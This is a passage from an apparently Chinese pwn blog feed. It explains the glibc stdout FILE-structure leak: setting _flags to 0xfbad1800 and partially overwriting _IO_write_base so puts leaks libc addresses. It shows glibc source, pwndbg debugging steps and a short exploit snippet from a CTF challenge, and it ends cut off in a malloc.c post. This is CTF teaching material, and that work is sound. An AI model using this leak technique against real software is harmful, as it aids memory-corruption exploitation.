f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>

<h3 id="IO-new-do-write"><a href="#IO-new-do-write" class="headerlink" title="_IO_new_do_write()"></a>_IO_new_do_write()</h3><p>跳转到<code>_IO_new_do_write</code>，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;<span class="comment">//这里也就是io_do_erite调用了new_do_write进行写出</span></span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"><span class="comment">//new_do_write</span></span><br><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">    <span class="comment">//首先检查了flags中_IO_IS_APPENDING标志位，0x1000处</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);<span class="comment">//这里就能实现输出f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>随便运行一个程序，用gdb调试：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">0x7ffff7dd2700 &lt;stderr&gt;:        0x00007ffff7dd2540      0x00007ffff7dd2620</span><br><span class="line">0x7ffff7dd2710 &lt;stdin&gt;: 0x00007ffff7dd18e0      0x00007ffff7a2db80</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    <span class="comment">#正常情况下_IO_write_base和_IO_write_ptr是相等的</span></span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看一下_IO_write_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x7ffff7dd26a3</span><br><span class="line">0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt;:   0xdd3780000000000a      0xffffff00007ffff7</span><br><span class="line">0x7ffff7dd26b3 &lt;_IO_2_1_stdout_+147&gt;:   0x000000ffffffffff      0xdd17a00000000000</span><br><span class="line">0x7ffff7dd26c3 &lt;_IO_2_1_stdout_+163&gt;:   0x00000000007ffff7      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d3 &lt;_IO_2_1_stdout_+179&gt;:   0x0000000000000000      0xffffff0000000000</span><br><span class="line">0x7ffff7dd26e3 &lt;_IO_2_1_stdout_+195&gt;:   0x00000000000000ff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f3 &lt;_IO_2_1_stdout_+211&gt;:   0xdd06e00000000000      0xdd254000007ffff7</span><br><span class="line">0x7ffff7dd2703 &lt;stderr+3&gt;:      0xdd262000007ffff7      0xdd18e000007ffff7</span><br><span class="line">0x7ffff7dd2713 &lt;stdin+3&gt;:       0xa2db8000007ffff7      0x00000000007ffff7</span><br><span class="line">0x7ffff7dd2723 &lt;map+3&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2733 &lt;__printf_arginfo_table+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2743 &lt;buf+3&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2753 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2763 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2773 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2783 &lt;buffer+3&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2793 &lt;ttyname_buf+3&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>若我们通过低字节覆盖，将它低字节覆盖为<code>\x00</code>，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x7ffff7dd2600</span><br><span class="line">0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2610 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0#这里包含了libc中的值</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>它就会根据<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>来输出从&lt;_IO_2_1_stderr_+192&gt;到 &lt;_IO_2_1_stdout_+131&gt;中间的内容</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>所以我们要泄露地址，首先要将 <code>io_file</code> 的 <code>_IO_CURRENTLY_PUTTING</code> 置 1，<code>_IO_IS_APPENDING</code> 0x1000 置 1，以及 <code>_IO_NO_WRITES</code> 0x8 不要为 1，就可以进行地址泄露了，一般可以覆盖为 <code>0xfbad1800</code>，就可以泄露 <code>write_base</code> 和 <code>write_ptr</code> 之间的值，随便运行个程序，我们可以看到这里，可以看到 <code>write_base</code> 和 <code>write_ptr</code> 都是 <code>libc</code>。</p>
<p><strong>deepseek解释0xfbad1800:</strong></p>
<p>在 <code>_flags</code> 字段 <code>0xfbad1800</code> 中，<code>0x1000</code> 和 <code>0x8</code> 对应的二进制位如下：</p>
<ol>
<li><strong>标志位解析</strong>：</li>
</ol>
<ul>
<li><p><strong><code>_IO_IS_APPENDING</code>（0x1000）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>12 位</strong>（从 0 开始计数）。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x1000 = 0x1000</code>，说明该位被设置为 <strong>1</strong>。</li>
<li><strong>作用</strong>：表示文件流处于追加模式（<code>append</code>），允许写入时自动定位到文件末尾。</li>
</ul>
</li>
<li><p><strong><code>_IO_NO_WRITES</code>（0x8）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>3 位</strong>。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x8 = 0</code>，说明该位被设置为 <strong>0</strong>。</li>
<li><strong>作用</strong>：允许写入操作（若为 1 则禁止写入）。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong><code>0xfbad1800</code> 的二进制分解</strong>：</li>
</ol>
<p>将 <code>0xfbad1800</code> 转换为 32 位二进制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1111 1011 1010 1101 0001 1000 0000 0000</span><br><span class="line">                       ^            ^</span><br><span class="line">                       |           |</span><br><span class="line">                       |           +-- 第 3 位 (0x8)：0</span><br><span class="line">                       +-- 第 12 位 (0x1000)：1</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>其他关键标志</strong>：</li>
</ol>
<ul>
<li><p><strong><code>_IO_CURRENTLY_PUTTING</code>（0x800）</strong>：</p>
<ul>
<li><strong>位位置</strong>：第 <strong>11 位</strong>。</li>
<li><strong>在 <code>0xfbad1800</code> 中的状态</strong>：<br><code>0xfbad1800 &amp; 0x800 = 0x800</code>，说明该位被设置为 <strong>1</strong>。</li>
<li><strong>作用</strong>：表示当前正在进行输出操作（<code>put</code>）。</li>
</ul>
</li>
<li><p><strong><code>_IO_MAGIC</code>（0xfbad0000）</strong>：</p>
<ul>
<li><strong>高 16 位</strong>：<code>0xfbad</code>，标识这是一个合法的 <code>FILE</code> 结构。</li>
</ul>
</li>
</ul>
<ol start="4">
<li><strong>总结</strong>：</li>
</ol>
<ul>
<li><strong><code>0xfbad1800</code> 的位设置</strong>：<ul>
<li><strong>第 12 位（0x1000）</strong>：1（允许追加模式）。</li>
<li><strong>第 3 位（0x8）</strong>：0（允许写入操作）。</li>
<li><strong>第 11 位（0x800）</strong>：1（正在写入）。</li>
</ul>
</li>
</ul>
<p>通过覆盖 <code>_flags</code> 为 <code>0xfbad1800</code>，可以满足以下条件：</p>
<ol>
<li>启用 <code>_IO_IS_APPENDING</code> 和 <code>_IO_CURRENTLY_PUTTING</code>。</li>
<li>禁用 <code>_IO_NO_WRITES</code>，从而允许地址泄露。</li>
</ol>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>随便找一个输出菜单有puts的堆题，直接gdb运行起来</p>
<p>第一步，通过<code>x/32gx &amp;_IO_2_1_stdout_</code>来查看 stdout 的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">0x7ffff7dd2700 &lt;stderr&gt;:        0x00007ffff7dd2540      0x00007ffff7dd2620</span><br><span class="line">0x7ffff7dd2710 &lt;stdin&gt;: 0x00007ffff7dd18e0      0x00007ffff7a2db80</span><br></pre></td></tr></table></figure>

<p>第二步，通过<code>p *(struct _IO_FILE_plus*)0x7ffff7dd2620</code>查看它的结构体信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三步，设置flag值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> *0x7ffff7dd2620 = 0xfbad1800</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br></pre></td></tr></table></figure>

<p>第四步，设置_IO_write_base低位为\x00</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> *0x7ffff7dd2640 = 0x7ffff7dd2600</span><br><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad1800      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd2600      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br></pre></td></tr></table></figure>

<p>再看结构体：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$4</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72542208,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br></pre></td></tr></table></figure>

<p>最终，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">1</span><br><span class="line">����&amp;��&amp;��&amp;�&amp;��&amp;��&amp;��&amp;��&amp;����������size:  </span><br></pre></td></tr></table></figure>

<p>可以看到在size: 前面多了一些东西，若我们在gdb的debug模式下就可以看到输出的是什么了。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>可以参考largebin_attack中的starctf_2019_heap_master</p>
<p>在exp中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))<span class="comment">#这个接收 b&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))<span class="comment">#jie&#x27;sh</span></span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br></pre></td></tr></table></figure>

<p>实现了接收泄露出的<code>_IO_file_jumps</code>的libc地址，从而计算出libc_base</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>io</tag>
      </tags>
  </entry>
  <entry>
    <title>glibc源码阅读</title>
    <url>/2025/04/22/glibc%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
    <content><![CDATA[<h1 id="malloc-c"><a href="#malloc-c" class="headerlink" title="malloc.c"></a>malloc.c</h1><h2 id="malloc-assert"><a href="#malloc-assert" class="headerlink" title="__malloc_assert"></a>__malloc_assert</h2><p>__int_malloc()函数的断言，一个用于处理断言失败的 C 语言宏和函数实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NDEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)			\</span></span><br><span class="line"><span class="meta">	 __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;<span class="comment">//声明一个外部变量 __progname，它存储程序的名称。</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span><span class="comment">//静态函数 __malloc_assert，用于处理断言失败的情况。因为它是静态的，所以它只能在当前文件中被访问。</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> 